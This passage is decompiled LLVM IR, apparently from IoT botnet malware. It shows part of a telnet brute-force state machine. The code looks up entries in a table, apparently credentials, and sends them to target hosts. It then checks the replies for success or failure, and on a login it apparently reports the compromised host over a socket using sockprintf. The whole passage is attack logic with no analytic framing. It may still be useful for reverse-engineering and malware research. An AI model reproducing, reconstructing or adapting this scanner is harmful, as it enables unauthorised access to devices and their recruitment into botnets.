  %v2_804c6c6 = inttoptr i32 %v0_804c6ec to i32*
  store i32 %v2_804bde4, i32* %v2_804c6c6, align 4
  %v1_804c6c9 = call i32 @reset_telstate(i32 %v4_804c5cc)
  store i32 %v1_804c6c9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cd9e

dec_label_pc_804c6d3:                             ; preds = %dec_label_pc_804c670
  %v1_804c6ec = add i32 %v0_804c6ec, 4
  %v2_804c6ec = inttoptr i32 %v1_804c6ec to i32*
  store i32 4, i32* %v2_804c6ec, align 4
  %v0_804c6f4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c6f4 = load i32, i32* @esp, align 4
  %v2_804c6f4 = inttoptr i32 %v1_804c6f4 to i32*
  store i32 %v0_804c6f4, i32* %v2_804c6f4, align 4
  %v2_804c6f7 = inttoptr i32 %v4_804c5cc to i32*
  %v3_804c6f7 = call i32 @advance_state(i32* %v2_804c6f7, i32 %v2_804bced)
  store i32 %v3_804c6f7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cd9e

dec_label_pc_804c701:                             ; preds = %dec_label_pc_804be1c
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  %v1_804c719 = add i32 %v2_804bde4, 24
  store i32 %v1_804c719, i32* %eax.global-to-local, align 4
  %v1_804c71c = inttoptr i32 %v1_804c719 to i32*
  %v2_804c71c = load i32, i32* %v1_804c71c, align 4
  store i32 %v2_804c71c, i32* @ebx, align 4
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  store i32 %v2_804bde2, i32* %eax.global-to-local, align 4
  %v3_804c734 = inttoptr i32 %v2_804bde4 to i32*
  %v4_804c734 = load i32, i32* %v3_804c734, align 4
  store i32 %v4_804c734, i32* %edx.global-to-local, align 4
  %v0_804c737 = load i32, i32* @esp, align 4
  %v1_804c737 = add i32 %v0_804c737, 16
  %v2_804c737 = inttoptr i32 %v1_804c737 to i32*
  store i32 ptrtoint (i32* @global_var_80621ec to i32), i32* %v2_804c737, align 4
  %v0_804c73f = load i32, i32* @esp, align 4
  %v1_804c73f = add i32 %v0_804c73f, 12
  %v2_804c73f = inttoptr i32 %v1_804c73f to i32*
  store i32 1024, i32* %v2_804c73f, align 4
  %v0_804c747 = load i32, i32* @ebx, align 4
  %v1_804c747 = load i32, i32* @esp, align 4
  %v2_804c747 = add i32 %v1_804c747, 8
  %v3_804c747 = inttoptr i32 %v2_804c747 to i32*
  store i32 %v0_804c747, i32* %v3_804c747, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_804c74e = load i32, i32* @esp, align 4
  %v2_804c74e = add i32 %v1_804c74e, 4
  %v3_804c74e = inttoptr i32 %v2_804c74e to i32*
  store i32 %arg1, i32* %v3_804c74e, align 4
  %v0_804c752 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c752 = load i32, i32* @esp, align 4
  %v2_804c752 = inttoptr i32 %v1_804c752 to i32*
  store i32 %v0_804c752, i32* %v2_804c752, align 4
  %v1_804c755 = call i32 @read_until_response(i32 %v6_804be32)
  %v1_804c75a = icmp eq i32 %v1_804c755, 0
  store i32 %v1_804bdd4, i32* @edx, align 4
  store i32 %v2_804bde4, i32* %eax.global-to-local, align 4
  br i1 %v1_804c75a, label %dec_label_pc_804c7e7, label %dec_label_pc_804c762

dec_label_pc_804c762:                             ; preds = %dec_label_pc_804c701
  store i32 %v1_804c719, i32* %eax.global-to-local, align 4
  %v2_804c77d = load i32, i32* %v1_804c71c, align 4
  store i32 %v2_804c77d, i32* %eax.global-to-local, align 4
  %v1_804c77f = load i32, i32* @esp, align 4
  %v2_804c77f = inttoptr i32 %v1_804c77f to i32*
  store i32 %v2_804c77d, i32* %v2_804c77f, align 4
  %v1_804c782 = call i32 @contains_fail(i32 %stack_var_-624.247)
  %v1_804c787 = icmp eq i32 %v1_804c782, 0
  store i32 %v1_804bdd4, i32* @edx, align 4
  store i32 %v2_804bde4, i32* %eax.global-to-local, align 4
  %v0_804c7d2 = load i32, i32* @esp, align 4
  %v1_804c7d2 = add i32 %v0_804c7d2, 4
  %v2_804c7d2 = inttoptr i32 %v1_804c7d2 to i32*
  br i1 %v1_804c787, label %dec_label_pc_804c7b9, label %dec_label_pc_804c78b

dec_label_pc_804c78b:                             ; preds = %dec_label_pc_804c762
  store i32 0, i32* %v2_804c7d2, align 4
  %v0_804c7ac = load i32, i32* %eax.global-to-local, align 4
  %v1_804c7ac = load i32, i32* @esp, align 4
  %v2_804c7ac = inttoptr i32 %v1_804c7ac to i32*
  store i32 %v0_804c7ac, i32* %v2_804c7ac, align 4
  %v2_804c7af = inttoptr i32 %stack_var_-624.247 to i32*
  %v3_804c7af = call i32 @advance_state(i32* %v2_804c7af, i32 %v2_804bced)
  store i32 %v3_804c7af, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cd9e

dec_label_pc_804c7b9:                             ; preds = %dec_label_pc_804c762
  store i32 5, i32* %v2_804c7d2, align 4
  %v0_804c7da = load i32, i32* %eax.global-to-local, align 4
  %v1_804c7da = load i32, i32* @esp, align 4
  %v2_804c7da = inttoptr i32 %v1_804c7da to i32*
  store i32 %v0_804c7da, i32* %v2_804c7da, align 4
  %v2_804c7dd = inttoptr i32 %stack_var_-624.247 to i32*
  %v3_804c7dd = call i32 @advance_state(i32* %v2_804c7dd, i32 %v2_804bced)
  store i32 %v3_804c7dd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cd9e

dec_label_pc_804c7e7:                             ; preds = %dec_label_pc_804c701
  store i32 %v1_804bde6, i32* %eax.global-to-local, align 4
  %v2_804c802 = load i32, i32* %v1_804bde9, align 4
  store i32 %v2_804c802, i32* %eax.global-to-local, align 4
  %v1_804c804 = add i32 %v2_804c802, 3
  store i32 %v1_804c804, i32* @ebx, align 4
  %v0_804c807 = load i32, i32* @esp, align 4
  %v1_804c807 = inttoptr i32 %v0_804c807 to i32*
  store i32 0, i32* %v1_804c807, align 4
  %v1_804c80e = inttoptr i32 %stack_var_-624.247 to i32*
  %v2_804c80e = call i32 @__GI_time(i32* %v1_804c80e)
  store i32 %v2_804c80e, i32* %eax.global-to-local, align 4
  %v0_804c813 = load i32, i32* @ebx, align 4
  %v7_804c813 = icmp ult i32 %v0_804c813, %v2_804c80e
  %v1_804c815 = icmp eq i1 %v7_804c813, false
  br i1 %v1_804c815, label %dec_label_pc_804cd9e, label %dec_label_pc_804c81b

dec_label_pc_804c81b:                             ; preds = %dec_label_pc_804c7e7
  store i32 %v1_804bdd4, i32* @edx, align 4
  store i32 %v2_804bde4, i32* %eax.global-to-local, align 4
  %v1_804c834 = load i32, i32* @esp, align 4
  %v2_804c834 = inttoptr i32 %v1_804c834 to i32*
  store i32 %v2_804bde4, i32* %v2_804c834, align 4
  %v1_804c837 = call i32 @reset_telstate(i32 %stack_var_-624.247)
  store i32 %v1_804c837, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cd9e

dec_label_pc_804c841:                             ; preds = %dec_label_pc_804be1c
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  store i32 %v2_804bde2, i32* %eax.global-to-local, align 4
  %v3_804c857 = add i32 %v2_804bf63, %v2_804bde2
  %v4_804c857 = inttoptr i32 %v3_804c857 to i8*
  %v5_804c857 = load i8, i8* %v4_804c857, align 1
  %v6_804c857 = zext i8 %v5_804c857 to i32
  store i32 %v6_804c857, i32* %eax.global-to-local, align 4
  %v1_804c85f = mul nuw nsw i32 %v6_804c857, 4
  %v2_804c85f = add nuw nsw i32 %v1_804c85f, 134619568
  %v3_804c85f = inttoptr i32 %v2_804c85f to i32*
  %v4_804c85f = load i32, i32* %v3_804c85f, align 4
  %v1_804c871 = and i32 %v4_804c85f, -256
  store i32 %v1_804c871, i32* %eax.global-to-local, align 4
  %v4_804c874 = inttoptr i32 %v4_804c85f to i8*
  store i32 %v4_804c85f, i32* @edi, align 4
  %v3_804c87a = call i32 @_strlen(i8* %v4_804c874)
  store i32 %v3_804c87a, i32* @esi, align 4
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  store i32 %v2_804bde2, i32* %eax.global-to-local, align 4
  %v5_804c899 = load i8, i8* %v4_804c857, align 1
  %v6_804c899 = zext i8 %v5_804c899 to i32
  store i32 %v6_804c899, i32* %eax.global-to-local, align 4
  %v1_804c8a1 = mul nuw nsw i32 %v6_804c899, 4
  %v2_804c8a1 = add nuw nsw i32 %v1_804c8a1, 134619568
  %v3_804c8a1 = inttoptr i32 %v2_804c8a1 to i32*
  %v4_804c8a1 = load i32, i32* %v3_804c8a1, align 4
  store i32 %v4_804c8a1, i32* @ebx, align 4
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  store i32 %v2_804bde2, i32* %eax.global-to-local, align 4
  %v3_804c8be = inttoptr i32 %v2_804bde4 to i32*
  %v4_804c8be = load i32, i32* %v3_804c8be, align 4
  store i32 %v4_804c8be, i32* %eax.global-to-local, align 4
  %v0_804c8c1 = load i32, i32* @esp, align 4
  %v1_804c8c1 = add i32 %v0_804c8c1, 12
  %v2_804c8c1 = inttoptr i32 %v1_804c8c1 to i32*
  store i32 16384, i32* %v2_804c8c1, align 4
  %v0_804c8c9 = load i32, i32* @esi, align 4
  %v1_804c8c9 = load i32, i32* @esp, align 4
  %v2_804c8c9 = add i32 %v1_804c8c9, 8
  %v3_804c8c9 = inttoptr i32 %v2_804c8c9 to i32*
  store i32 %v0_804c8c9, i32* %v3_804c8c9, align 4
  %v0_804c8cd = load i32, i32* @ebx, align 4
  %v1_804c8cd = load i32, i32* @esp, align 4
  %v2_804c8cd = add i32 %v1_804c8cd, 4
  %v3_804c8cd = inttoptr i32 %v2_804c8cd to i32*
  store i32 %v0_804c8cd, i32* %v3_804c8cd, align 4
  %v0_804c8d1 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c8d1 = load i32, i32* @esp, align 4
  %v2_804c8d1 = inttoptr i32 %v1_804c8d1 to i32*
  store i32 %v0_804c8d1, i32* %v2_804c8d1, align 4
  %v4_804c8d4 = call i32 @__libc_send(i32 %v4_804c85f, i32 %stack_var_-624.247, i32 %v2_804bced, i32 %v6_804be32)
  store i32 %v4_804c8d4, i32* %eax.global-to-local, align 4
  %v2_804c8d9 = icmp slt i32 %v4_804c8d4, 0
  %v1_804c8db = icmp eq i1 %v2_804c8d9, false
  store i32 %v1_804bdd4, i32* @edx, align 4
  br i1 %v1_804c8db, label %dec_label_pc_804c903, label %dec_label_pc_804c8dd

dec_label_pc_804c8dd:                             ; preds = %dec_label_pc_804c841
  store i32 %v2_804bde4, i32* %eax.global-to-local, align 4
  %v1_804c8f6 = load i32, i32* @esp, align 4
  %v2_804c8f6 = inttoptr i32 %v1_804c8f6 to i32*
  store i32 %v2_804bde4, i32* %v2_804c8f6, align 4
  %v1_804c8f9 = call i32 @reset_telstate(i32 %v4_804c85f)
  store i32 %v1_804c8f9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cd9e

dec_label_pc_804c903:                             ; preds = %dec_label_pc_804c841
  store i32 %v2_804bde2, i32* %eax.global-to-local, align 4
  %v4_804c919 = load i32, i32* %v3_804c8be, align 4
  store i32 %v4_804c919, i32* %eax.global-to-local, align 4
  %v0_804c91c = load i32, i32* @esp, align 4
  %v1_804c91c = add i32 %v0_804c91c, 12
  %v2_804c91c = inttoptr i32 %v1_804c91c to i32*
  store i32 16384, i32* %v2_804c91c, align 4
  %v0_804c924 = load i32, i32* @esp, align 4
  %v1_804c924 = add i32 %v0_804c924, 8
  %v2_804c924 = inttoptr i32 %v1_804c924 to i32*
  store i32 2, i32* %v2_804c924, align 4
  %v0_804c92c = load i32, i32* @esp, align 4
  %v1_804c92c = add i32 %v0_804c92c, 4
  %v2_804c92c = inttoptr i32 %v1_804c92c to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8057f04.173 to i32), i32* %v2_804c92c, align 4
  %v0_804c934 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c934 = load i32, i32* @esp, align 4
  %v2_804c934 = inttoptr i32 %v1_804c934 to i32*
  store i32 %v0_804c934, i32* %v2_804c934, align 4
  %v4_804c937 = call i32 @__libc_send(i32 %v4_804c85f, i32 %stack_var_-624.247, i32 %v2_804bced, i32 %v6_804be32)
  %v2_804c93c = icmp slt i32 %v4_804c937, 0
  %v1_804c93e = icmp eq i1 %v2_804c93c, false
  store i32 %v1_804bdd4, i32* @edx, align 4
  store i32 %v2_804bde4, i32* %eax.global-to-local, align 4
  %v0_804c97f = load i32, i32* @esp, align 4
  br i1 %v1_804c93e, label %dec_label_pc_804c966, label %dec_label_pc_804c940

dec_label_pc_804c940:                             ; preds = %dec_label_pc_804c903
  %v2_804c959 = inttoptr i32 %v0_804c97f to i32*
  store i32 %v2_804bde4, i32* %v2_804c959, align 4
  %v1_804c95c = call i32 @reset_telstate(i32 %v4_804c85f)
  store i32 %v1_804c95c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cd9e

dec_label_pc_804c966:                             ; preds = %dec_label_pc_804c903
  %v1_804c97f = add i32 %v0_804c97f, 4
  %v2_804c97f = inttoptr i32 %v1_804c97f to i32*
  store i32 6, i32* %v2_804c97f, align 4
  %v0_804c987 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c987 = load i32, i32* @esp, align 4
  %v2_804c987 = inttoptr i32 %v1_804c987 to i32*
  store i32 %v0_804c987, i32* %v2_804c987, align 4
  %v2_804c98a = inttoptr i32 %v4_804c85f to i32*
  %v3_804c98a = call i32 @advance_state(i32* %v2_804c98a, i32 %stack_var_-624.247)
  store i32 %v3_804c98a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cd9e

dec_label_pc_804c994:                             ; preds = %dec_label_pc_804be1c
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  %v1_804c9ac = add i32 %v2_804bde4, 24
  store i32 %v1_804c9ac, i32* %eax.global-to-local, align 4
  %v1_804c9af = inttoptr i32 %v1_804c9ac to i32*
  %v2_804c9af = load i32, i32* %v1_804c9af, align 4
  store i32 %v2_804c9af, i32* @ebx, align 4
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  store i32 %v2_804bde2, i32* %eax.global-to-local, align 4
  %v3_804c9c7 = inttoptr i32 %v2_804bde4 to i32*
  %v4_804c9c7 = load i32, i32* %v3_804c9c7, align 4
  store i32 %v4_804c9c7, i32* %edx.global-to-local, align 4
  %v0_804c9ca = load i32, i32* @esp, align 4
  %v1_804c9ca = add i32 %v0_804c9ca, 16
  %v2_804c9ca = inttoptr i32 %v1_804c9ca to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_8062240.174 to i32), i32* %v2_804c9ca, align 4
  %v0_804c9d2 = load i32, i32* @esp, align 4
  %v1_804c9d2 = add i32 %v0_804c9d2, 12
  %v2_804c9d2 = inttoptr i32 %v1_804c9d2 to i32*
  store i32 1024, i32* %v2_804c9d2, align 4
  %v0_804c9da = load i32, i32* @ebx, align 4
  %v1_804c9da = load i32, i32* @esp, align 4
  %v2_804c9da = add i32 %v1_804c9da, 8
  %v3_804c9da = inttoptr i32 %v2_804c9da to i32*
  store i32 %v0_804c9da, i32* %v3_804c9da, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_804c9e1 = load i32, i32* @esp, align 4
  %v2_804c9e1 = add i32 %v1_804c9e1, 4
  %v3_804c9e1 = inttoptr i32 %v2_804c9e1 to i32*
  store i32 %arg1, i32* %v3_804c9e1, align 4
  %v0_804c9e5 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c9e5 = load i32, i32* @esp, align 4
  %v2_804c9e5 = inttoptr i32 %v1_804c9e5 to i32*
  store i32 %v0_804c9e5, i32* %v2_804c9e5, align 4
  %v1_804c9e8 = call i32 @read_until_response(i32 %v6_804be32)
  store i32 %v1_804c9e8, i32* %eax.global-to-local, align 4
  %v1_804c9ed = icmp eq i32 %v1_804c9e8, 0
  br i1 %v1_804c9ed, label %dec_label_pc_804cbd4, label %dec_label_pc_804c9f5

dec_label_pc_804c9f5:                             ; preds = %dec_label_pc_804c994
  store i32 %storemerge49, i32* @ebx, align 4
  %v0_804c9f8 = load i32, i32* @esp, align 4
  %v1_804c9f8 = inttoptr i32 %v0_804c9f8 to i32*
  store i32 0, i32* %v1_804c9f8, align 4
  %v1_804c9ff = inttoptr i32 %stack_var_-628.248 to i32*
  %v2_804c9ff = call i32 @__GI_time(i32* %v1_804c9ff)
  store i32 %v2_804c9ff, i32* @esi, align 4
  %v0_804ca09 = load i32, i32* @ebx, align 4
  %v2_804ca19 = mul i32 %v0_804ca09, 28
  %v1_804ca1d = add i32 %v2_804ca1b, %v2_804ca19
  %v2_804ca20 = inttoptr i32 %v1_804ca1d to i32*
  store i32 %v2_804c9ff, i32* %v2_804ca20, align 4
  store i32 %v1_804bdd4, i32* @edx, align 4
  store i32 %v1_804c9ac, i32* %eax.global-to-local, align 4
  %v2_804ca3d = load i32, i32* %v1_804c9af, align 4
  store i32 %v2_804ca3d, i32* %eax.global-to-local, align 4
  %v1_804ca3f = load i32, i32* @esp, align 4
  %v2_804ca3f = inttoptr i32 %v1_804ca3f to i32*
  store i32 %v2_804ca3d, i32* %v2_804ca3f, align 4
  %v1_804ca42 = call i32 @contains_fail(i32 %stack_var_-628.248)
  store i32 %v1_804ca42, i32* %eax.global-to-local, align 4
  %v1_804ca47 = icmp eq i32 %v1_804ca42, 0
  store i32 %v1_804bdd4, i32* @edx, align 4
  br i1 %v1_804ca47, label %dec_label_pc_804ca79, label %dec_label_pc_804ca4b

dec_label_pc_804ca4b:                             ; preds = %dec_label_pc_804c9f5
  store i32 %v2_804bde4, i32* %eax.global-to-local, align 4
  %v0_804ca64 = load i32, i32* @esp, align 4
  %v1_804ca64 = add i32 %v0_804ca64, 4
  %v2_804ca64 = inttoptr i32 %v1_804ca64 to i32*
  store i32 0, i32* %v2_804ca64, align 4
  %v0_804ca6c = load i32, i32* %eax.global-to-local, align 4
  %v1_804ca6c = load i32, i32* @esp, align 4
  %v2_804ca6c = inttoptr i32 %v1_804ca6c to i32*
  store i32 %v0_804ca6c, i32* %v2_804ca6c, align 4
  %v3_804ca6f = call i32 @advance_state(i32* %v1_804c9ff, i32 %stack_var_-624.247)
  store i32 %v3_804ca6f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cd9e

dec_label_pc_804ca79:                             ; preds = %dec_label_pc_804c9f5
  store i32 %v1_804c9ac, i32* %eax.global-to-local, align 4
  %v2_804ca94 = load i32, i32* %v1_804c9af, align 4
  store i32 %v2_804ca94, i32* %eax.global-to-local, align 4
  %v1_804ca96 = load i32, i32* @esp, align 4
  %v2_804ca96 = inttoptr i32 %v1_804ca96 to i32*
  store i32 %v2_804ca94, i32* %v2_804ca96, align 4
  %v1_804ca99 = call i32 @contains_success(i32 %stack_var_-628.248)
  store i32 %v1_804ca99, i32* %eax.global-to-local, align 4
  %v1_804ca9e = icmp eq i32 %v1_804ca99, 0
  store i32 %v1_804bdd4, i32* @edx, align 4
  br i1 %v1_804ca9e, label %dec_label_pc_804cbae, label %dec_label_pc_804caa6

dec_label_pc_804caa6:                             ; preds = %dec_label_pc_804ca79
  store i32 %v2_804bde2, i32* %eax.global-to-local, align 4
  %v3_804cabc = add i32 %v2_804be72, %v2_804bde2
  %v4_804cabc = inttoptr i32 %v3_804cabc to i8*
  %v5_804cabc = load i8, i8* %v4_804cabc, align 1
  %v6_804cabc = zext i8 %v5_804cabc to i32
  store i32 %v6_804cabc, i32* %eax.global-to-local, align 4
  %v10_804cac1 = icmp eq i8 %v5_804cabc, 2
  %v1_804cac3 = icmp eq i1 %v10_804cac1, false
  store i32 %v1_804bdd4, i32* @edx, align 4
  br i1 %v1_804cac3, label %dec_label_pc_804caf3, label %dec_label_pc_804cac5

dec_label_pc_804cac5:                             ; preds = %dec_label_pc_804caa6
  store i32 %v2_804bde4, i32* %eax.global-to-local, align 4
  %v0_804cade = load i32, i32* @esp, align 4
  %v1_804cade = add i32 %v0_804cade, 4
  %v2_804cade = inttoptr i32 %v1_804cade to i32*
  store i32 7, i32* %v2_804cade, align 4
  %v0_804cae6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cae6 = load i32, i32* @esp, align 4
  %v2_804cae6 = inttoptr i32 %v1_804cae6 to i32*
  store i32 %v0_804cae6, i32* %v2_804cae6, align 4
  %v3_804cae9 = call i32 @advance_state(i32* %v1_804c9ff, i32 %stack_var_-624.247)
  store i32 %v3_804cae9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cd9e

dec_label_pc_804caf3:                             ; preds = %dec_label_pc_804caa6
  store i32 %v2_804bde2, i32* %eax.global-to-local, align 4
  %v3_804cb09 = add i32 %v2_804bf63, %v2_804bde2
  %v4_804cb09 = inttoptr i32 %v3_804cb09 to i8*
  %v5_804cb09 = load i8, i8* %v4_804cb09, align 1
  %v6_804cb09 = zext i8 %v5_804cb09 to i32
  store i32 %v6_804cb09, i32* %eax.global-to-local, align 4
  %v1_804cb11 = mul nuw nsw i32 %v6_804cb09, 4
  %v2_804cb11 = add nuw nsw i32 %v1_804cb11, 134619568
  %v3_804cb11 = inttoptr i32 %v2_804cb11 to i32*
  %v4_804cb11 = load i32, i32* %v3_804cb11, align 4
  store i32 %v4_804cb11, i32* @ebx, align 4
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  store i32 %v2_804bde2, i32* %eax.global-to-local, align 4
  %v3_804cb2e = add i32 %v2_804bfaa, %v2_804bde2
  %v4_804cb2e = inttoptr i32 %v3_804cb2e to i8*
  %v5_804cb2e = load i8, i8* %v4_804cb2e, align 2
  %v6_804cb2e = zext i8 %v5_804cb2e to i32
  store i32 %v6_804cb2e, i32* %eax.global-to-local, align 4
  %v1_804cb36 = mul nuw nsw i32 %v6_804cb2e, 4
  %v2_804cb36 = add nuw nsw i32 %v1_804cb36, 134619556
  %v3_804cb36 = inttoptr i32 %v2_804cb36 to i32*
  %v4_804cb36 = load i32, i32* %v3_804cb36, align 4
  store i32 %v4_804cb36, i32* @esi, align 4
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  store i32 %v2_804bde4, i32* %eax.global-to-local, align 4
  %v1_804cb56 = load i32, i32* @esp, align 4
  %v2_804cb56 = inttoptr i32 %v1_804cb56 to i32*
  store i32 %v2_804bde4, i32* %v2_804cb56, align 4
  %v0_804cb59 = call i32 @get_telstate_host()
  store i32 %v0_804cb59, i32* %eax.global-to-local, align 4
  %v0_804cb5e = load i32, i32* @global_var_8062580.20, align 128
  store i32 %v0_804cb5e, i32* %edx.global-to-local, align 4
  %v0_804cb64 = load i32, i32* @ebx, align 4
  %v1_804cb64 = load i32, i32* @esp, align 4
  %v2_804cb64 = add i32 %v1_804cb64, 16
  %v3_804cb64 = inttoptr i32 %v2_804cb64 to i32*
  store i32 %v0_804cb64, i32* %v3_804cb64, align 4
  %v0_804cb68 = load i32, i32* @esi, align 4
  %v1_804cb68 = load i32, i32* @esp, align 4
  %v2_804cb68 = add i32 %v1_804cb68, 12
  %v3_804cb68 = inttoptr i32 %v2_804cb68 to i32*
  store i32 %v0_804cb68, i32* %v3_804cb68, align 4
  %v1_804cb6c = load i32, i32* @esp, align 4
  %v2_804cb6c = add i32 %v1_804cb6c, 8
  %v3_804cb6c = inttoptr i32 %v2_804cb6c to i32*
  store i32 %v0_804cb59, i32* %v3_804cb6c, align 4
  %v0_804cb70 = load i32, i32* @esp, align 4
  %v1_804cb70 = add i32 %v0_804cb70, 4
  %v2_804cb70 = inttoptr i32 %v1_804cb70 to i32*
  store i32 ptrtoint ([23 x i8]* @global_var_8057f07.175 to i32), i32* %v2_804cb70, align 4
  %v0_804cb78 = load i32, i32* %edx.global-to-local, align 4
  %v1_804cb78 = load i32, i32* @esp, align 4
  %v2_804cb78 = inttoptr i32 %v1_804cb78 to i32*
  store i32 %v0_804cb78, i32* %v2_804cb78, align 4
  %v2_804cb7b = call i32 @sockprintf(i32 %stack_var_-628.248, i32 %stack_var_-624.247)
  store i32 %v1_804bdd4, i32* @edx, align 4
  store i32 %v2_804bde4, i32* %eax.global-to-local, align 4
  %v0_804cb99 = load i32, i32* @esp, align 4
  %v1_804cb99 = add i32 %v0_804cb99, 4
  %v2_804cb99 = inttoptr i32 %v1_804cb99 to i32*
  store i32 7, i32* %v2_804cb99, align 4
  %v0_804cba1 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cba1 = load i32, i32* @esp, align 4
  %v2_804cba1 = inttoptr i32 %v1_804cba1 to i32*
  store i32 %v0_804cba1, i32* %v2_804cba1, align 4
  %v3_804cba4 = call i32 @advance_state(i32* %v1_804c9ff, i32 %stack_var_-624.247)
  store i32 %v3_804cba4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cd9e

dec_label_pc_804cbae:                             ; preds = %dec_label_pc_804ca79
  store i32 %v2_804bde4, i32* %eax.global-to-local, align 4
  %v1_804cbc7 = load i32, i32* @esp, align 4
  %v2_804cbc7 = inttoptr i32 %v1_804cbc7 to i32*
  store i32 %v2_804bde4, i32* %v2_804cbc7, align 4
  %v1_804cbca = call i32 @reset_telstate(i32 %stack_var_-628.248)
  store i32 %v1_804cbca, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cd9e

dec_label_pc_804cbd4:                             ; preds = %dec_label_pc_804c994
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  store i32 %v1_804bde6, i32* %eax.global-to-local, align 4
  %v2_804cbef = load i32, i32* %v1_804bde9, align 4
  store i32 %v2_804cbef, i32* %eax.global-to-local, align 4
  %v1_804cbf1 = add i32 %v2_804cbef, 7
  store i32 %v1_804cbf1, i32* @ebx, align 4
  %v0_804cbf4 = load i32, i32* @esp, align 4
  %v1_804cbf4 = inttoptr i32 %v0_804cbf4 to i32*
  store i32 0, i32* %v1_804cbf4, align 4
  %v1_804cbfb = inttoptr i32 %stack_var_-628.248 to i32*
  %v2_804cbfb = call i32 @__GI_time(i32* %v1_804cbfb)
  store i32 %v2_804cbfb, i32* %eax.global-to-local, align 4
  %v0_804cc00 = load i32, i32* @ebx, align 4
  %v7_804cc00 = icmp ult i32 %v0_804cc00, %v2_804cbfb
  %v1_804cc02 = icmp eq i1 %v7_804cc00, false
  br i1 %v1_804cc02, label %dec_label_pc_804cd9e, label %dec_label_pc_804cc08

dec_label_pc_804cc08:                             ; preds = %dec_label_pc_804cbd4
  store i32 %v1_804bdd4, i32* @edx, align 4
  store i32 %v2_804bde4, i32* %eax.global-to-local, align 4
  %v1_804cc21 = load i32, i32* @esp, align 4
  %v2_804cc21 = inttoptr i32 %v1_804cc21 to i32*
  store i32 %v2_804bde4, i32* %v2_804cc21, align 4
  %v1_804cc24 = call i32 @reset_telstate(i32 %stack_var_-628.248)
  store i32 %v1_804cc24, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cd9e

dec_label_pc_804cc2e:                             ; preds = %dec_label_pc_804be1c
  store i32 %storemerge49, i32* @ebx, align 4
  %v0_804cc31 = load i32, i32* @esp, align 4
  %v1_804cc31 = inttoptr i32 %v0_804cc31 to i32*
  store i32 0, i32* %v1_804cc31, align 4
  %v1_804cc38 = inttoptr i32 %v6_804be32 to i32*
  %v2_804cc38 = call i32 @__GI_time(i32* %v1_804cc38)
  %v0_804cc42 = load i32, i32* @ebx, align 4
  %v2_804cc52 = mul i32 %v0_804cc42, 28
  %v1_804cc56 = add i32 %v2_804ca1b, %v2_804cc52
  %v2_804cc59 = inttoptr i32 %v1_804cc56 to i32*
  store i32 %v2_804cc38, i32* %v2_804cc59, align 4
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  store i32 %v2_804bde2, i32* %eax.global-to-local, align 4
  %v3_804cc71 = inttoptr i32 %v2_804bde4 to i32*
  %v4_804cc71 = load i32, i32* %v3_804cc71, align 4
  store i32 %v4_804cc71, i32* %eax.global-to-local, align 4
  %v0_804cc74 = load i32, i32* @esp, align 4
  %v1_804cc74 = add i32 %v0_804cc74, 12
  %v2_804cc74 = inttoptr i32 %v1_804cc74 to i32*
  store i32 16384, i32* %v2_804cc74, align 4
  %v0_804cc7c = load i32, i32* @esp, align 4
  %v1_804cc7c = add i32 %v0_804cc7c, 8
  %v2_804cc7c = inttoptr i32 %v1_804cc7c to i32*
  store i32 4, i32* %v2_804cc7c, align 4
  %v0_804cc84 = load i32, i32* @esp, align 4
  %v1_804cc84 = add i32 %v0_804cc84, 4
  %v2_804cc84 = inttoptr i32 %v1_804cc84 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8057f1e.176 to i32), i32* %v2_804cc84, align 4
  %v0_804cc8c = load i32, i32* %eax.global-to-local, align 4
  %v1_804cc8c = load i32, i32* @esp, align 4
  %v2_804cc8c = inttoptr i32 %v1_804cc8c to i32*
  store i32 %v0_804cc8c, i32* %v2_804cc8c, align 4
  %v4_804cc8f = call i32 @__libc_send(i32 %stack_var_-628.248, i32 %stack_var_-624.247, i32 %v2_804bced, i32 %v6_804be32)
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  store i32 %v2_804bde2, i32* %eax.global-to-local, align 4
  %v4_804ccaa = load i32, i32* %v3_804cc71, align 4
  store i32 %v4_804ccaa, i32* %eax.global-to-local, align 4
  %v0_804ccad = load i32, i32* @esp, align 4
  %v1_804ccad = add i32 %v0_804ccad, 12
  %v2_804ccad = inttoptr i32 %v1_804ccad to i32*
  store i32 16384, i32* %v2_804ccad, align 4
  %v0_804ccb5 = load i32, i32* @esp, align 4
  %v1_804ccb5 = add i32 %v0_804ccb5, 8
  %v2_804ccb5 = inttoptr i32 %v1_804ccb5 to i32*
  store i32 7, i32* %v2_804ccb5, align 4
